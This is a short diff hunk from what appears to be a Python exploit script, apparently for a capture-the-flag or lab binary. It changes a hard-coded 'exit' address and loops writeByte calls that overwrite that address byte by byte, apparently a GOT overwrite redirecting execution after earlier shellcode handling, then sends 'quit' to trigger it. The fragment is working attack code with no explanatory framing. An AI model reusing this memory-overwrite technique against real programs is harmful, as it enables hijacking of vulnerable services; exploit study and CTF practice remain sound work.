@@ -74,10 +74,10 @@ for b in sc:
     #readLine(s)
     idx += 1
 
-exit = 0x0804a018
+exit = 0x08049f30
 for i in range(4):
     writeByte(s, exit + i, (argv>> (8 * i)) & 0xff, buf_start)
-    readLine(s)
+    #readLine(s)
 
 s.send('quit\n')
 
